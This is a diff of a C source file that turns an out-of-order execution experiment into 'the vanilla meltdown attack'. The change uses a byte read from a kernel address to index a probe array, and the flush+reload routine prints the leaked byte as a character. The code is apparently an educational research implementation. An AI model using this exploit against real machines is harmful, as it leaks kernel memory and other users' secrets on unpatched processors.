@@ -1,8 +1,9 @@
 /*
- * ooe.c 
- * Exploit out of order execution to determine if we might be 
- * able to continue execution past an instruction that triggers 
- * an execption (say, for instance, reading kernel memory...)
+ * vanilla.c 
+ * The vanilla meltdown attack. 
+ *
+ * NOTE:
+ * Low attack success rate with this basic approach. 
  *
  * Kyle Dotterrer
  * December, 2018 
@@ -108,7 +109,7 @@ void reload_side_channel(void) {
 		// what the secret value used to access the array was 
 		if (time2 <= CACHE_HIT_THRESHOLD) {
 			printf("array[%d*4096 + %d] is in cache\n", i, DELTA);
-			printf("the secret = %d\n", i);
+			printf("the secret = %c\n", (char) i);
 		}
 	}
 }
@@ -119,11 +120,9 @@ void meltdown(unsigned long kernel_data_addr) {
 	// operation will cause memory violation
 	kernel_data = *(char *) kernel_data_addr;
 
-	// but will this still execute? 
-	array[7*4096 + DELTA] += 1;
-
-	// have to use the variable so -Wall doesnt complain 
-	printf("got kernel data: %c\n", kernel_data); 
+	// altered from previous example
+	// now we use the kernel data to access the probe array 
+	array[kernel_data*4096 + DELTA] += 1;
 }
 
 static void catch_segv() {
